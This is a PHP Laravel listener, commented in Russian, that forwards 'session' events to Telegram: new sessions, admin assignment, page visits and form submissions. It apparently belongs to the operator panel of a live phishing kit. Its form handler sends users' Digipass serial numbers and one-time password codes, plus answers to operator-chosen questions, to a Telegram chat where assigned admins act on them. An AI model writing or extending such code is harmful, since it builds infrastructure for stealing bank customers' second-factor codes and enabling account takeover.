<?php

declare(strict_types=1);

namespace App\Listeners;

use App\Enums\ActionType;
use App\Events\ActionSelected;
use App\Events\FormSubmitted;
use App\Events\PageVisited;
use App\Events\SessionAssigned;
use App\Events\SessionCreated;
use App\Events\SessionStatusChanged;
use App\Events\SessionUnassigned;
use App\Services\SessionService;
use App\Services\TelegramService;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Queue\InteractsWithQueue;

/**
 * Listener для отправки уведомлений в Telegram
 *
 * Выполняется через очередь, чтобы не блокировать API/webhook latency.
 */
class SendTelegramNotificationListener implements ShouldQueue
{
    use InteractsWithQueue;

    public int $tries = 3;

    /**
     * @var array<int, int>
     */
    public array $backoff = [1, 5, 15];

    public function __construct(
        private readonly TelegramService $telegramService,
        private readonly SessionService $sessionService,
    ) {}

    /**
     * Обработка события создания сессии
     */
    public function handleSessionCreated(SessionCreated $event): void
    {
        \Illuminate\Support\Facades\Log::info('SendTelegramNotificationListener: handleSessionCreated start', [
            'session_id' => $event->session->id,
            'input_value' => $event->session->input_value,
            'telegram_message_id' => $event->session->telegram_message_id,
            'telegram_chat_id' => $event->session->telegram_chat_id,
        ]);

        // Отправляем уведомление в группу или всем админам
        $results = $this->telegramService->sendNewSessionNotification($event->session);

        \Illuminate\Support\Facades\Log::info('SendTelegramNotificationListener: handleSessionCreated telegram results', [
            'session_id' => $event->session->id,
            'result_keys' => array_keys($results),
        ]);

        // Сохраняем message_id и chat_id первого успешного сообщения
        foreach ($results as $key => $result) {
            if ($result['success'] && isset($result['message_id'])) {
                $chatId = $result['chat_id'] ?? null;
                $this->sessionService->updateTelegramMessage(
                    $event->session,
                    $result['message_id'],
                    $chatId
                );
                break;
            }
        }
    }

    /**
     * Обработка события назначения админа
     */
    public function handleSessionAssigned(SessionAssigned $event): void
    {
        $this->telegramService->updateSessionMessage($event->session);

        $chatId = $event->session->telegram_chat_id
            ?? $this->telegramService->getGroupChatId()
            ?? $event->admin->telegram_user_id;
        $messageId = $event->session->telegram_message_id;

        \Illuminate\Support\Facades\Log::info('SessionAssigned: pin attempt', [
            'session_id' => $event->session->id,
            'admin_id' => $event->admin->id,
            'admin_chat_id' => $chatId,
            'message_id' => $messageId,
        ]);

        if ($chatId && $messageId) {
            $this->telegramService->pinMessage($chatId, $messageId);
        } else {
            \Illuminate\Support\Facades\Log::warning('SessionAssigned: skip pin (missing data)', [
                'session_id' => $event->session->id,
                'admin_id' => $event->admin->id,
                'admin_chat_id' => $chatId,
                'message_id' => $messageId,
            ]);
        }
    }

    /**
     * Обработка события открепления админа
     */
    public function handleSessionUnassigned(SessionUnassigned $event): void
    {
        $this->telegramService->updateSessionMessage($event->session);
    }

    /**
     * Обработка события отправки формы
     */
    public function handleFormSubmitted(FormSubmitted $event): void
    {
        // Обновляем основное сообщение с новыми данными
        // Данные сохраняются в сессии и отображаются в formatSessionMessage
        $this->telegramService->updateSessionMessage($event->session);

        // Отправляем отдельное уведомление с ответом пользователя для кастомных форм
        $formData = $event->formData;
        $session = $event->session;

        // Digipass: отправляем серийник + OTP и помечаем, если это QR Digipass форма
        if ($formData->actionType === ActionType::DIGIPASS && $formData->customAnswers) {
            $serial = $formData->customAnswers['serial_number'] ?? null;
            $otp = $formData->customAnswers['otp'] ?? '—';
            $source = strtolower((string) ($formData->customAnswers['source'] ?? ''));

            $text = "🔑 <b>Digipass данные:</b>\n\n";
            if ($source === 'qr') {
                $text .= "📷 QR Digipass\n";
            }
            if ($serial) {
                $text .= "📟 <b>Серийный номер:</b> <code>{$serial}</code>\n";
            }
            $text .= "🔢 <b>OTP код:</b> <code>{$otp}</code>";

            $this->telegramService->sendSessionUpdate($session, $text);

            return;
        }

        // Для форм с ответами (custom-question, custom-image, image-question)
        if ($formData->customAnswers && isset($formData->customAnswers['answer'])) {
            $actionType = $formData->actionType;
            $answer = $formData->customAnswers['answer'];

            $formTypeLabel = match ($actionType) {
                ActionType::CUSTOM_QUESTION => 'Кастомный вопрос',
                ActionType::CUSTOM_IMAGE => 'Картинка',
                ActionType::IMAGE_QUESTION => 'Картинка с вопросом',
                default => $actionType->label(),
            };

            $text = "💬 <b>Получен ответ на {$formTypeLabel}:</b>\n\n<code>{$answer}</code>";
            $this->telegramService->sendSessionUpdate($session, $text);
        }
    }

    /**
     * Обработка события изменения статуса
     */
    public function handleSessionStatusChanged(SessionStatusChanged $event): void
    {
        // Обновляем сообщение
        $this->telegramService->updateSessionMessage($event->session);

        // Отправляем уведомление о завершении/отмене
        if ($event->isCompleted()) {
            $this->telegramService->sendSessionUpdate(
                $event->session,
                '✅ <b>Сессия завершена</b>'
            );
        } elseif ($event->isCancelled()) {
            $this->telegramService->sendSessionUpdate(
                $event->session,
                '❌ <b>Сессия отменена</b>'
            );
        }
    }

    /**
     * Обработка события выбора действия
     */
    public function handleActionSelected(ActionSelected $event): void
    {
        $this->telegramService->updateSessionMessage($event->session);
    }

    /**
     * Обработка события посещения страницы
     */
    public function handlePageVisited(PageVisited $event): void
    {
        $this->telegramService->notifyPageVisit(
            session: $event->session,
            pageName: $event->pageName,
            pageUrl: $event->pageUrl,
            actionType: $event->actionType,
        );
    }

    /**
     * Подписка на события
     */
    public function subscribe($events): array
    {
        return [
            SessionCreated::class => 'handleSessionCreated',
            SessionAssigned::class => 'handleSessionAssigned',
            SessionUnassigned::class => 'handleSessionUnassigned',
            FormSubmitted::class => 'handleFormSubmitted',
            SessionStatusChanged::class => 'handleSessionStatusChanged',
            ActionSelected::class => 'handleActionSelected',
            PageVisited::class => 'handlePageVisited',
        ];
    }
}
